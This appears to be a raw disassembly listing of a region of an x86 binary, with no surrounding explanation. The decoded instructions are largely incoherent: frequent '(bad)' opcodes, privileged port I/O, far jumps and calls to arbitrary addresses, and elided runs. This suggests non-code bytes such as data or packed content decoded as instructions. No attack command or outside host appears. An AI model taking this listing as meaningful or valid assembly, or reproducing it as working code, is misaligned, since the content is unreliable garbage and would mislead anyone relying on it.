  411dab:	mov    al,ds:0x9eb27338
  411db0:	dec    edx
  411db1:	(bad)  
  411db2:	sti    
  411db3:	mov    ecx,0x1bfa0417
  411db8:	test   DWORD PTR [eax-0xd],ebp
  411dbb:	adc    BYTE PTR [ebx],bl
  411dbd:	mov    edi,DWORD PTR [ebx+ebp*1-0x2]
  411dc1:	dec    ebp
  411dc3:	mov    ah,0x81
  411dc5:	pop    ss
  411dc6:	(bad)  
  411dc7:	sbb    eax,DWORD PTR [edx]
  411dc9:	inc    eax
  411dca:	jae    0x411d95
  411dcc:	pop    ss
  411dcd:	add    al,0xfa
  411dcf:	sbb    ecx,DWORD PTR [ecx+0x2200a85]
  411dd5:	add    BYTE PTR [ecx-0x57],dh
  411dd8:	sbb    eax,DWORD PTR [edx+edi*8]
  411ddb:	sbb    ecx,DWORD PTR [edi+ecx*1-0x3ec61208]
  411de2:	or     BYTE PTR [ebx+0x1],0x8e
  411de6:	out    0x27,al
  411de8:	add    al,BYTE PTR [eax]
  411dea:	pop    es
  411deb:	push   ebp
  411dec:	mov    eax,DWORD PTR [ebp+0x2280a]
  411df2:	add    DWORD PTR [edi+ebp*2],0x1c
  411df6:	inc    BYTE PTR [ecx+ebp*8]
  411df9:	ret    
  411dfa:	jb     0x411e5e
  411dfc:	hlt    
  411dfd:	call   DWORD PTR [ebp+0x31]
  411e00:	pop    edi
  411e01:	cmp    ch,0x8
  411e04:	jmp    0xe0cb8f0c
  411e09:	(bad)  
  411e0a:	cmp    eax,0x146231
	...
  411e1f:	add    al,bh
  411e21:	push   esi
  411e22:	out    dx,al
  411e23:	inc    ebp
  411e24:	jne    0x411e3a
  411e26:	call   0xe94a1fb4
  411e2b:	add    esp,DWORD PTR [edi+0x581620b]
  411e31:	or     ecx,ebp
  411e33:	add    eax,DWORD PTR [ebx+0x5ffe08a]
  411e39:	xor    DWORD PTR [eax],ebp
  411e3b:	mov    ecx,DWORD PTR [edi+0x10]
  411e3e:	in     eax,dx
  411e3f:	add    edi,edx
  411e41:	jge    0x411ea9
  411e43:	adc    esi,esi
  411e45:	add    al,0xe9
  411e47:	mov    WORD PTR [edi+0xd],?
  411e4a:	in     eax,0x3
  411e4c:	cli    
  411e4d:	jp     0x411e2f
  411e4f:	add    eax,0x8ca72fc3
  411e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e55:	in     al,0x9b
  411e57:	mov    edi,ebp
  411e59:	shl    BYTE PTR [ecx+0x49],cl
  411e5c:	aad    0x4e
  411e5e:	je     0x411e98
  411e60:	mov    ah,0x7c
  411e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e63:	test   ch,cl
  411e65:	or     DWORD PTR [ecx+0x2c1db78c],edi
  411e6b:	aaa    
  411e6c:	pushf  
  411e6d:	xor    BYTE PTR [ecx+0x48],ah
  411e70:	js     0x411e98
  411e72:	jmp    0x8178:0x503f80d2
  411e79:	xor    BYTE PTR ds:0x69484,bh
  411e7f:	sahf   
  411e80:	xchg   BYTE PTR [edx-0x19],al
  411e83:	jne    0x411e85
	...
  411e95:	add    BYTE PTR ds:0x43c6fe2f,ah
  411e9b:	rol    ecx,1
  411e9d:	icebp  
  411e9e:	stc    
  411e9f:	or     eax,0x16
  411ea2:	clc    
  411ea3:	jle    0x411ec0
  411ea5:	in     eax,0xf9
  411ea7:	add    al,0x8d
  411ea9:	nop
  411eaa:	lock mov ecx,0x7b7218
  411eb0:	add    al,0xe9
  411eb2:	stc    
  411eb3:	jge    0x411e3a
  411eb5:	shr    DWORD PTR ds:0x7729fe30,1
  411ebb:	bound  ebx,QWORD PTR [ebx]
  411ebd:	in     eax,0xf9
  411ebf:	add    al,0x89
  411ec1:	outs   dx,DWORD PTR ds:[esi]
  411ec2:	out    dx,al
  411ec3:	or     BYTE PTR [eax],al
  411ec5:	jmp    0xed58a94a
  411eca:	stc    
  411ecb:	add    al,0x8a
  411ecd:	fsincos 
  411ecf:	push   edx
  411ed0:	std    
  411ed1:	stos   DWORD PTR es:[edi],eax
  411ed2:	xchg   bh,bh
  411ed4:	add    BYTE PTR [edi+0x12],bl
  411ed7:	or     DWORD PTR [eax],eax
  411ed9:	jmp    0x67cc2b88
  411ede:	push   es
  411edf:	or     DWORD PTR [eax],eax
  411ee1:	jmp    0xe558a86c
  411ee6:	stc    
  411ee7:	add    al,0x40
  411ee9:	jo     0x411f47
  411eeb:	or     al,0x4
  411eed:	jmp    0xd9c69ceb
  411ef2:	mov    ch,0x2f
  411ef4:	(bad)  
  411ef5:	bound  ebp,QWORD PTR [eax+ebx*1]
  411ef8:	add    al,0xe9
	...
  411f0a:	add    BYTE PTR [eax],al
  411f0c:	stc    
  411f0d:	jp     0x411f1e
  411f0f:	jmp    0x411f5c
  411f11:	xor    al,cl
  411f13:	popa   
  411f14:	out    dx,al
  411f15:	add    eax,0x2f8ded8e
  411f1a:	inc    BYTE PTR [eax]
  411f1c:	inc    esi
  411f1d:	adc    BYTE PTR [ebx-0x1d05c7a],cl
  411f23:	(bad)  
  411f24:	fisubr DWORD PTR [esi+0x3630416]
  411f2a:	inc    eax
  411f2b:	mov    ebp,ecx
  411f2d:	or     al,0x4
  411f2f:	add    BYTE PTR [ebx-0x80],dl
  411f32:	test   BYTE PTR [eax],dl
  411f34:	add    eax,DWORD PTR [bx+si]
  411f37:	mov    edx,ebp
  411f39:	adc    BYTE PTR [eax+eax*1],al
  411f3c:	push   ebx
  411f3d:	jge    0x411f4d
  411f3f:	add    ah,cl
  411f41:	test   al,0x88
  411f44:	push   ebx
  411f45:	or     BYTE PTR [esi+0x3171c],cl
  411f4b:	jne    0x411f47
  411f4d:	jnp    0x411ed3
  411f4f:	adc    BYTE PTR [edi],dl
  411f51:	add    eax,DWORD PTR [eax]
  411f53:	mov    DWORD PTR [ebp+0x2300040b],esp
  411f59:	inc    ebx
  411f5a:	xchg   DWORD PTR [esi-0x1d0e1],ebp
  411f60:	mov    dh,BYTE PTR [ecx+0x2e3040e]
  411f66:	mov    eax,DWORD PTR [esi-0x1d135]
  411f6c:	mov    ds:0x8dff22,eax
	...
  411f81:	add    bh,bl
  411f83:	cs (bad) 
  411f85:	push   esi
  411f87:	jnp    0xfe6ff313
  411f8d:	dec    DWORD PTR [edx-0x50]
  411f90:	push   ss
  411f91:	add    al,0xd3
  411f93:	add    al,BYTE PTR [eax-0x77]
  411f96:	cmp    eax,0xa3000416
  411f9b:	add    DWORD PTR [eax+edx*1-0x74fffd69],0x40a15
  411fa6:	cli    
  411fa7:	sbb    edx,DWORD PTR [edx+0x1f]
  411faa:	sti    
  411fab:	int    0x16
  411fad:	add    al,0xfa
  411faf:	sbb    ebp,DWORD PTR [edi+0x12a67118]
  411fb5:	add    al,0xfa
  411fb7:	sbb    ecx,DWORD PTR [ebx+0x2281285]
  411fbd:	add    BYTE PTR [edx-0x9e49b4c],bh
  411fc3:	sbb    eax,DWORD PTR [edx]
  411fc5:	mov    DWORD PTR [esp+ebp*1-0x2],edi
  411fc9:	dec    DWORD PTR [ebp-0x5d]
  411fcc:	jl     0x411fe5
  411fce:	(bad)  
  411fcf:	sbb    eax,DWORD PTR [edx]
  411fd1:	rcr    BYTE PTR [edx],1
  411fd3:	sbb    eax,0x1bfe1b84
  411fd8:	add    dh,BYTE PTR [ebp+0x13]
  411fdb:	mov    ds:0x1bfe0f7c,eax
  411fe0:	add    cl,BYTE PTR [ecx+0x474]
	...
  411ff6:	add    BYTE PTR [eax],al
  411ff8:	cli    
  411ff9:	fisttp DWORD PTR [edx+0x227eead]
  411fff:	add    BYTE PTR [ebx-0x62],dh
  412002:	adc    eax,DWORD PTR [edx+edi*8]
  412005:	sbb    eax,DWORD PTR [edi+0x22012b5]
  41200b:	add    dl,cl
  41200d:	add    eax,0x33b85cd6
  412012:	add    cl,BYTE PTR [ebx+0x55fe4836]
  412018:	sub    eax,0xea23b7a3
  41201d:	mov    ds:0x1b7a3c32,al
  412022:	add    al,BYTE PTR [eax]
  412024:	dec    ecx
  412025:	push   eax
  412026:	jg     0x412026
  412028:	(bad)  
  412029:	sub    cl,BYTE PTR [ebx]
  41202b:	cmp    esi,DWORD PTR [edi+eax*2-0x2]
  41202f:	jmp    DWORD PTR [ebp-0x5b3022fc]
  412035:	dec    esp
  412036:	add    DWORD PTR [eax+edi*2+0x24],eax
  41203a:	out    dx,al
  41203b:	aam    0x78
  41203d:	inc    esp
  41203e:	jecxz  0x412015
  412040:	mov    ebx,0x77f8e8fc
  412045:	call   0xb93b242e
  41204a:	repz imul ch
  41204d:	add    al,0xe9
  41204f:	add    ebp,ecx
  412051:	pop    es
  412052:	push   0x25
  412054:	sti    
  412055:	sbb    eax,edi
  412057:	not    BYTE PTR [ebp+0x8]
  41205a:	jmp    0x412062
	...
  41206b:	add    BYTE PTR [eax],al
  41206d:	add    al,cl
  41206f:	add    ebx,DWORD PTR [esi-0x174fba0a]
  412075:	add    ecx,eax
  412077:	add    ebp,DWORD PTR [esi-0x6603e2be]
  41207d:	sub    BYTE PTR [ebp+0x1],0x99
  412081:	sub    ebx,edi
  412083:	sub    ah,ch
  412085:	xor    al,0xc4
  412087:	jns    0x412037
  412089:	mov    BYTE PTR ds:0xc39f41c,ch
  41208f:	sub    eax,0xfaedbf5b
  412094:	and    ebp,edx
  412096:	lahf   
  412097:	inc    edx
  412098:	lock add ecx,DWORD PTR [ebp+0x1d]
  41209c:	in     al,0x39
  41209e:	in     al,dx
  41209f:	sub    al,0xd
  4120a1:	and    DWORD PTR [ebp-0xabdb8ff],0x31893a04
  4120ab:	loope  0x41208d
  4120ad:	into   
  4120ae:	daa    
  4120af:	adc    BYTE PTR [edi-0x13227880],0x3
  4120b6:	cli    
  4120b7:	add    al,0x16
  4120b9:	add    eax,0xe800107e
  4120be:	stc    
  4120bf:	add    al,0x81
  4120c1:	jb     0x41213c
  4120c3:	sub    al,0xfe
  4120c5:	jmp    0xddc3e634
  4120ca:	mov    ch,0x14
  4120cc:	add    al,0xda
  4120ce:	xchg   ebx,eax
  4120cf:	and    al,0x36
  4120d1:	push   edx
	...
  4120e2:	add    BYTE PTR [eax],al
  4120e4:	into   
  4120e5:	sub    cl,BYTE PTR [edx-0x5242ec9]
  4120eb:	ds cs jg 0x4120bc
  4120ef:	inc    ecx
  4120f0:	xor    ebp,DWORD PTR [esi]
  4120f2:	(bad)  
  4120f3:	cs jae 0x4120be
  4120f6:	and    eax,DWORD PTR [ecx]
  4120f8:	jae    0x41208c
  4120fa:	pmulhw mm7,mm1
  4120fd:	add    al,0x8a
  4120ff:	and    ch,BYTE PTR ds:0xfb200205
  412105:	inc    ebp
  412106:	pop    esi
  412107:	jno    0x412104
  412109:	sub    eax,DWORD PTR [ebp-0x1d3ca27]
  41210f:	pusha  
  412110:	xchg   eax,ebp
  412112:	add    ebp,ecx
  412114:	stc    
  412115:	retf   0x425c
  412118:	mov    ah,0x3
  41211a:	add    BYTE PTR [edx-0x47],ch
  41211d:	sub    al,BYTE PTR [eax]
  41211f:	xchg   edi,eax
  412120:	jmp    0x89b:0x7ae90000
  412127:	cmp    al,0xef
  412129:	jg     0x4120b0
  41212b:	fscale 
  41212d:	add    al,0x0
  41212f:	pusha  
  412130:	adc    BYTE PTR [ebx],0x4
  412133:	jmp    0x57c9e631
  412138:	or     al,BYTE PTR [ecx]
  41213a:	add    cl,ch
  41213c:	push   esi
  41213d:	or     BYTE PTR [edi],0xed
  412140:	stc    
  412141:	add    al,0x8b
  412143:	test   BYTE PTR [bx+si],0x0
	...
  412157:	add    BYTE PTR [eax],al
  412159:	add    bl,dl
  41215b:	test   eax,0xf66a0206
  412160:	mov    edi,0xbe009b88
  412165:	sbb    al,0x9f
  412167:	pop    es
  412168:	add    BYTE PTR [ebp-0x6],dh
  41216b:	stos   DWORD PTR es:[edi],eax
  41216c:	test   BYTE PTR [eax],dl
  41216e:	lahf   
  41216f:	pop    es
  412170:	add    BYTE PTR [ecx+0x3f91d],cl
  412176:	xchg   ebx,eax
  412177:	inc    edi
  412178:	xchg   DWORD PTR [esi+0x397],ebp
  41217e:	jmp    0x8b07:0x63040e7e
  412185:	xchg   BYTE PTR [ebx+0x3],cl
  412188:	add    BYTE PTR [eax],al
  41218a:	and    esp,DWORD PTR [ecx]
  41218c:	mov    ebx,edx
  41218e:	and    cl,BYTE PTR [ebx]
  412190:	pop    es
  412191:	and    DWORD PTR [ecx],0x3
  412194:	push   edx
  412195:	mov    esp,ebp
  412197:	or     al,cl
  412199:	cli    
  41219a:	hlt    
  41219b:	test   DWORD PTR [ecx+0x35386],0xb7f89b00
  4121a5:	add    DWORD PTR [ebx],edx
  4121a7:	pop    es
  4121a8:	add    BYTE PTR [ecx],al
  4121aa:	lea    edx,[edi]
  4121ac:	add    al,0x0
  4121ae:	and    ebp,DWORD PTR [eax+0x71f249c]
  4121b4:	add    BYTE PTR [ecx-0x178d8],al
  4121ba:	adc    esi,DWORD PTR [edx+0x16]
  4121bd:	add    DWORD PTR [eax],0x0
	...
  4121d0:	inc    edi
  4121d1:	sbb    eax,0x6a580216
  4121d6:	and    bl,BYTE PTR [eax]
  4121d8:	add    ch,BYTE PTR [edx-0x27a31734]
  4121de:	std    
  4121df:	call   DWORD PTR [edi+edx*2]
  4121e2:	pop    ebx
  4121e3:	pop    ebx
  4121e4:	cli    
  4121e5:	pop    ebp
  4121e6:	cli    
  4121e7:	(bad)  
  4121e8:	jp     0x412181
  4121ea:	add    al,BYTE PTR ds:0x3b41bfa
  4121f0:	jecxz  0x4121d1
  4121f2:	out    0x17,eax
  4121f4:	jnp    0x4121ad
  4121f6:	add    bh,BYTE PTR [ebp-0x6]
  4121f9:	sbb    esi,DWORD PTR [ebx+eax*1+0x17e657d3]
  412200:	sbb    DWORD PTR [eax-0x1a],0x40a72b17
  412207:	out    0x16,eax
  412209:	(bad)  
  41220a:	xor    esi,edi
  41220c:	sbb    eax,0x385acf62
  412211:	xor    al,0x2
  412213:	(bad)  
  412214:	je     0x41221a
  412216:	or     BYTE PTR [eax],al
  412218:	cli    
  412219:	sbb    al,0x2
  41221b:	add    dl,bh
  41221d:	pushf  
  41221e:	sub    eax,0x21bfa7f
  412223:	jae    0x4121e8
  412225:	sahf   
  412226:	scas   al,BYTE PTR es:[edi]
  412227:	and    esp,edx
  412229:	pop    ds
  41222a:	mov    ch,0x41
  41222c:	add    DWORD PTR [edx+0x1bfa03e6],esp
  412232:	mov    dh,0x39
	...
  412244:	add    BYTE PTR [eax],al
  412246:	and    ah,BYTE PTR [esi]
  412248:	sub    al,0xfe
  41224a:	and    eax,0xf9e740a7
  41224f:	and    eax,0x5a81fe30
  412254:	sbb    ecx,esp
  412256:	adc    edx,DWORD PTR [ebx+0x30]
  412259:	mov    DWORD PTR [esi+0x6c8b0bff],edi
  41225f:	dec    esp
  412260:	push   es
  412261:	add    dl,bh
  412263:	mov    ch,0x54
  412265:	and    edi,ebx
  412267:	sbb    eax,0xfab80154
  41226c:	jnp    0x41226e
  41226e:	fld    QWORD PTR [edi+ebp*2]
  412271:	adc    al,0xfe
  412273:	add    al,0xe9
  412275:	jp     0x4122e6
  412277:	loopne 0x412265
  412279:	add    edi,edx
  41227b:	retf   0xcd2b
  41227e:	mov    ebx,0xc484e8fc
  412283:	sub    edi,esp
  412285:	jno    0x412298
  412287:	add    ecx,ebp
  412289:	add    esi,DWORD PTR [edi-0x67]
  41228c:	fbstp  TBYTE PTR [esi+0x146e7e02]
  412292:	inc    BYTE PTR [ecx+ebp*8]
  412295:	jp     0x41230e
  412297:	or     al,0xed
  412299:	add    edi,edx
  41229b:	les    ebx,FWORD PTR [edi+0x62]
  41229e:	loope  0x4122a0
  4122a0:	jmp    0xd8c3a5a8
  4122a5:	pop    es
  4122a6:	cli    
  4122a7:	add    al,0x62
  4122a9:	mov    al,BYTE PTR [eax]
	...
  4122bb:	add    BYTE PTR ds:0x7003e901,cl
  4122c1:	adc    al,0xeb
  4122c3:	push   ebp
  4122c4:	push   edi
  4122c5:	inc    esi
  4122c6:	jo     0x4122dc
  4122c8:	sti    
  4122c9:	push   0xfffffff4
  4122cb:	pop    es
  4122cc:	cli    
  4122cd:	add    al,0x94
  4122cf:	or     dh,BYTE PTR [ecx-0x7e]
  4122d2:	fadd   DWORD PTR [edi]
  4122d4:	cli    
  4122d5:	add    al,0x70
  4122d7:	mov    al,BYTE PTR ds:0xba03e901
  4122dd:	jnp    0x41231d
  4122df:	adc    dh,dh
  4122e1:	add    al,0xe9
  4122e3:	jp     0x412364
  4122e5:	adc    al,0xe5
  4122e7:	add    edi,edx
  4122e9:	jge    0x412359
  4122eb:	or     edi,esi
  4122ed:	add    al,0xe9
  4122ef:	push   ebx
  4122f0:	fucomp st(5)
  4122f2:	out    0xf9,ax
  4122f5:	add    al,0xe9
  4122f7:	mov    bh,0x6b
  4122f9:	jl     0x4122fa
  4122fb:	test   eax,0x6a072038
  412300:	cmp    DWORD PTR [ebx],eax
  412302:	push   eax
  412303:	xchg   ecx,eax
  412304:	jae    0x412333
  412306:	(bad)  
  412307:	sahf   
  412308:	dec    esi
  412309:	jp     0x41231a
  41230b:	in     eax,dx
  41230c:	stc    
  41230d:	add    al,0x88
  41230f:	lock push ecx
  412311:	add    eax,0x5f9e900
  412316:	xchg   cl,bl
  412318:	cmc    
  412319:	add    al,0x0
  41231b:	pusha  
  41231c:	mov    esp,esp
  41231e:	add    ebp,ecx
	...
  412330:	add    BYTE PTR [eax],al
  412332:	stc    
  412333:	test   edx,edi
  412335:	imul   edi,ecx,0x1da0004
  41233b:	test   BYTE PTR [ebx+0xd],ch
  41233e:	test   BYTE PTR [edx],0x8b
  412341:	mov    ch,0x95
  412343:	adc    BYTE PTR [edx+0x72],dl
  412346:	mov    ebx,0x2a40631f
  41234b:	daa    
  41234c:	pop    esi
  41234d:	xchg   edi,eax
  41234e:	xor    al,0xcb
  412350:	shl    ecx,0xf9
  412353:	test   edx,edi
  412355:	jmp    0x9b412856
  41235a:	cmc    
  41235b:	fld    QWORD PTR [ebx-0x33]
  41235e:	icebp  
  41235f:	test   edx,edi
  412361:	jmp    0x7c3f4bf2
  412366:	nop
  412367:	fld    QWORD PTR [ebx-0x3b]
  41236a:	add    DWORD PTR [ebx+edx*2-0x33],edi
  41236e:	icebp  
  41236f:	ror    BYTE PTR [edx-0x712fee1],cl
  412375:	out    0xe5,al
  412377:	(bad)  
  412378:	pop    ebp
  412379:	cmp    al,0x41
  41237b:	inc    esi
  41237c:	pop    es
  41237d:	jmp    0xe55c8a80
  412382:	stc    
  412383:	add    al,0x75
  412385:	add    dl,bl
  412387:	stos   BYTE PTR es:[edi],al
  412388:	test   BYTE PTR [eax],dl
  41238a:	xlat   BYTE PTR ds:[ebx]
  41238b:	add    eax,DWORD PTR [eax]
  41238d:	mov    DWORD PTR [ebp-0x7],edx
  412390:	add    eax,DWORD PTR [eax]
  412392:	rol    DWORD PTR [ebx-0x79],cl
  412395:	scas   al,BYTE PTR es:[edi]
	...
  4123a6:	add    BYTE PTR [eax],al
  4123a8:	(bad)  
  4123a9:	cld    
  4123aa:	(bad)  
  4123ab:	dec    DWORD PTR [edx+0x7f]
  4123ae:	push   cs
  4123af:	add    al,0xd3
  4123b1:	add    ecx,DWORD PTR [ebx-0x347a]
  4123b7:	call   DWORD PTR [ebx-0x304200e0]
  4123bd:	(bad)  
  4123be:	(bad)  
  4123bf:	jmp    DWORD PTR [esi-0x3c797508]
  4123c5:	(bad)  
  4123c6:	(bad)  
  4123c7:	dec    DWORD PTR [edx]
  4123c9:	jg     0x4123e1
  4123cb:	add    al,0xa3
  4123cd:	add    eax,DWORD PTR [eax-0x77]
  4123d0:	jge    0x4123e6
  4123d2:	add    al,0x0
  4123d4:	xchg   ebx,eax
  4123d5:	test   al,0x84
  4123d7:	adc    BYTE PTR [edi+0x3],ah
  4123da:	add    BYTE PTR [ebx+0x3f8d5],cl
  4123e0:	push   ebx
  4123e1:	rcr    DWORD PTR [esi],cl
  4123e3:	mov    eax,DWORD PTR [edi-0x37ade9e1]
  4123e9:	out    0xe6,al
  4123eb:	aam    0x1b
  4123ed:	fdivr  st,st(5)
  4123ef:	pop    edi
  4123f0:	lea    edx,[ecx+ebx*2-0x3e]
  4123f4:	pop    ebx
  4123f5:	add    ecx,DWORD PTR [ebx-0x7300b8bc]
  4123fb:	nop
  4123fc:	and    ecx,DWORD PTR [ebx-0x6f970001]
  412402:	add    al,BYTE PTR [ebx+edx*1]
  412405:	add    esi,DWORD PTR [esi+0x19]
  412408:	mov    BYTE PTR [eax+0x40a],ch
	...
  41241e:	and    eax,DWORD PTR [ebx]
  412420:	cmp    eax,ecx
  412422:	cli    
  412423:	(bad)  
  412424:	or     BYTE PTR [ebx],ch
  412426:	cmp    ebx,DWORD PTR [ebx+0x6]
  412429:	add    BYTE PTR [ecx],ah
  41242b:	pop    ebp
  41242c:	pop    es
  41242d:	add    BYTE PTR [edx+0x1d],ah
  412430:	add    al,dl
  412432:	(bad)  
  412433:	sbb    esi,ecx
  412435:	mov    edi,0x830220b8
  41243a:	out    0x2c,al
  41243c:	rcl    DWORD PTR [ecx+eax*4-0x8],1
  412440:	out    0x1f,eax
  412442:	sub    al,0x4b
  412444:	dec    ecx
  412445:	mov    cl,bl
  412447:	out    dx,eax
  412448:	jl     0x4124a5
  41244a:	fimul  WORD PTR [ebx+0x7b]
  41244d:	pop    ebx
  41244e:	(bad)  
  41244f:	and    ebp,ebx
  412451:	lods   eax,DWORD PTR ds:[esi]
  412452:	repnz pop ss
  412454:	add    al,BYTE PTR [eax]
  412456:	in     eax,dx
  412457:	call   0xa19:0x1c95ff61
  41245e:	jg     0x4123e0
  412460:	out    0xff,al
  412462:	test   DWORD PTR [edx+eax*1],ebx
  412465:	lea    edx,[esi]
  412467:	add    BYTE PTR [ebx+ecx*4],al
  41246a:	jl     0x412484
  41246c:	push   es
  41246d:	add    dl,bh
  41246f:	cwde   
  412470:	jp     0x412471
  412472:	fstp   QWORD PTR [edx+eax*1]
  412475:	cmp    esi,DWORD PTR [edx]
  412477:	outs   dx,BYTE PTR ds:[esi]
  412478:	adc    eax,0x630848b
  41247d:	add    dl,bh
  41247f:	and    al,BYTE PTR [ebx+0x75]
	...
  412492:	add    BYTE PTR [eax],al
  412494:	inc    BYTE PTR [edx+0x43]
  412497:	jmp    0x93fa:0x44342f1
  41249e:	add    eax,DWORD PTR [eax]
  4124a0:	and    DWORD PTR [edx],ebx
  4124a2:	icebp  
  4124a3:	mov    edi,0x3fa9e71
  4124a8:	cli    
  4124a9:	sbb    edi,ebp
  4124ab:	mov    ch,0xeb
  4124ad:	add    al,0xf6
  4124af:	jne    0x412473
  4124b1:	add    esi,DWORD PTR [edx-0x28]
  4124b4:	outs   dx,DWORD PTR ds:[esi]
  4124b5:	add    DWORD PTR [edx+0x0],esp
  4124b8:	jo     0x412534
  4124ba:	push   cs
  4124bb:	jnp    0x4124be
  4124bd:	jle    0x412530
  4124bf:	xchg   ch,dh
  4124c1:	add    cl,ch
  4124c3:	add    esi,ebp
  4124c5:	outs   dx,BYTE PTR ds:[esi]
  4124c6:	fdivr  st,st(4)
  4124c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c9:	(bad)  
  4124ca:	out    0x78,eax
  4124cc:	inc    ecx
  4124cd:	(bad)  
  4124ce:	in     al,dx
  4124cf:	js     0x412538
  4124d1:	add    ch,ah
  4124d3:	add    edi,edx
  4124d5:	jnp    0x4124d3
  4124d7:	add    BYTE PTR [edx-0x5fc16fd],0x3
  4124de:	ja     0x4124e8
  4124e0:	test   BYTE PTR [ecx+ebp*8],0x2
  4124e4:	je     0x4124e2
  4124e6:	in     al,dx
  4124e7:	add    edi,edx
  4124e9:	jns    0x412551
  4124eb:	or     dh,bh
  4124ed:	add    al,0xe9
  4124ef:	js     0x4124a6
  4124f1:	fldcw  WORD PTR [esi+0x0]
  4124f4:	inc    BYTE PTR [ecx+ebp*8]
  4124f7:	add    BYTE PTR [eax],0x0
	...
  41250a:	add    BYTE PTR [ecx+eax*8],0x2
  41250e:	cli    
  41250f:	scas   al,BYTE PTR es:[edi]
  412510:	in     eax,dx
  412511:	mov    ebx,0x7ec7e82
  412516:	cli    
  412517:	add    al,0xf0
  412519:	pop    ebp
  41251a:	cmc    
  41251b:	add    cl,ch
  41251d:	add    eax,DWORD PTR ds:0x4c2c9283
  412523:	and    eax,0xf519c871
  412528:	push   edx
  412529:	add    al,0xd5
  41252b:	add    ebp,ecx
  41252d:	call   0x7b2fd36d
  412532:	leave  
  412533:	loopne 0x4124ed
  412535:	sbb    dl,dh
  412537:	cmp    edi,0x85f5f8f0
  41253d:	and    edi,ecx
  41253f:	add    al,0x0
  412541:	test   BYTE PTR [edi-0x70120040],0xb8
  412548:	add    BYTE PTR [edx+0x35],ah
  41254b:	jg     0x412550
  41254d:	(bad)  
  41254e:	in     eax,0x8c
  412550:	cmp    al,dl
  412552:	out    dx,al
  412553:	mov    BYTE PTR [edx-0x74fb0618],dh
  412559:	(bad)  [bx+si]
  41255c:	add    cl,ch
  41255e:	push   esp
  41255f:	or     BYTE PTR [edi],cl
  412561:	scas   al,BYTE PTR es:[edi]
  412562:	mov    ch,0xe8
  412564:	sbb    ebp,ecx
  412566:	shl    DWORD PTR [esi+edi*8],0xd2
  41256a:	xor    al,0x96
  41256c:	cmp    DWORD PTR [edx+0x0],esp
	...
  41257f:	add    dh,ah
  412581:	fdivp  st(2),st
  412583:	std    
  412584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412585:	xchg   ecx,eax
  412586:	xchg   cl,ch
  412588:	add    DWORD PTR ds:0x877b200,0x9af9e904
  412592:	pop    ss
  412593:	jb     0x41260c
  412595:	adc    BYTE PTR [ecx+ebp*8],al
  412598:	stc    
  412599:	fcomip st,st(7)
  41259b:	fcomip st,st(5)
  41259d:	out    dx,eax
  41259e:	test   DWORD PTR [edx+0x75],0xb668f7ef
  4125a5:	and    esp,DWORD PTR [esi-0x18]
  4125a8:	stc    
  4125a9:	das    
  4125aa:	add    edx,edi
  4125ac:	push   cs
  4125ad:	pop    DWORD PTR ds:0x8c5c6562
  4125b3:	in     eax,dx
  4125b4:	dec    esi
  4125b5:	ffreep st(4)
  4125b7:	call   0x9a1d:0xcd53dd01
  4125be:	add    esp,DWORD PTR [eax+0x4d]
  4125c1:	call   0xed7925f1
  4125c6:	or     eax,0x78184
  4125cb:	add    BYTE PTR [esi+0x23fffe8c],dl
  4125d1:	or     BYTE PTR [ebx-0x781f1733],cl
  4125d7:	dec    esp
  4125d8:	push   esp
  4125da:	cmp    cl,BYTE PTR [edi+ebp*8+0x3c]
  4125de:	or     eax,0xa0987
	...
  4125f3:	add    BYTE PTR [eax],al
  4125f5:	add    BYTE PTR [eax+0x5d],ch
  4125f8:	and    dl,BYTE PTR [eax]
  4125fa:	imul   esi,ebp,0x1dff3a00
  412600:	dec    BYTE PTR [edx-0x44eddb09]
  412606:	loope  0x41260f
  412608:	add    BYTE PTR [eax],al
  41260a:	out    dx,eax
  41260b:	sbb    al,0x39
  41260d:	mov    gs,WORD PTR [edi-0x2b0001dd]
  412613:	test   al,cl
  412615:	add    BYTE PTR [ebx-0x40ab74f9],ah
  41261b:	pop    ss
  41261c:	cmp    edx,ebx
  41261e:	mov    al,ds:0xa14d8b28
  412623:	mov    ds:0x43a72be6,al
  412628:	mov    bl,BYTE PTR es:[edi+0x1c]
  41262c:	(bad)  
  41262d:	cmp    DWORD PTR [edx-0x5dbcfbac],edx
  412633:	xor    bl,al
  412635:	jb     0x412668
  412637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412638:	dec    edx
  412639:	and    al,0x4f
  41263b:	mov    ds:0x33fb246a,al
  412640:	fmul   DWORD PTR [edi]
  412642:	fucomip st,st(1)
  412644:	(bad)  
  412645:	jmp    DWORD PTR [ebx+0x32]
  412648:	pop    edx
  412649:	and    al,0x43
  41264b:	push   ebp
  41264c:	inc    ebp
  41264d:	push   ebx
  41264e:	cli    
  41264f:	pop    esp
  412650:	jge    0x41261f
  412652:	and    bh,BYTE PTR [edi-0x69d201d3]
  412658:	mov    bh,0x23
	...
  41266a:	add    BYTE PTR [eax],al
  41266c:	or     dl,BYTE PTR [edi+0x7d0223cf]
  412672:	aam    0x8a
  412674:	inc    esp
  412675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412676:	sbb    esp,edi
  412678:	ins    DWORD PTR es:[edi],dx
  412679:	daa    
  41267a:	sub    esi,edi
  41267c:	shl    DWORD PTR ds:0x21d64b7d,1
  412682:	add    eax,0x1803b2ed
  412687:	ret    
  412688:	cmp    al,0x63
  41268a:	pop    ss
  41268b:	mov    dl,BYTE PTR [esi+0x8]
  41268e:	fadd   st(0),st
  412690:	loopne 0x4126c0
  412692:	jge    0x412655
  412694:	mov    ebx,0xb8030944
  412699:	das    
  41269a:	mov    esi,0x4a26ea23
  41269f:	jne    0x412695
  4126a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126a2:	mov    dh,0x23
  4126a4:	adc    al,BYTE PTR [edi+0x507c3abc]
  4126aa:	(bad)  
  4126ab:	jmp    DWORD PTR [ebp+0x4b52c019]
  4126b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126b2:	cmp    bh,ah
  4126b4:	sbb    DWORD PTR [esi+0x6081fe29],edx
  4126ba:	fimul  WORD PTR [edi]
  4126bc:	jno    0x412672
  4126be:	jge    0x412703
  4126c0:	(bad)  
  4126c1:	adc    edx,esp
  4126c3:	dec    edi
  4126c4:	add    DWORD PTR [edx],0xcb704f1b
  4126ca:	sub    DWORD PTR [edx-0x75c708ce],ecx
	...
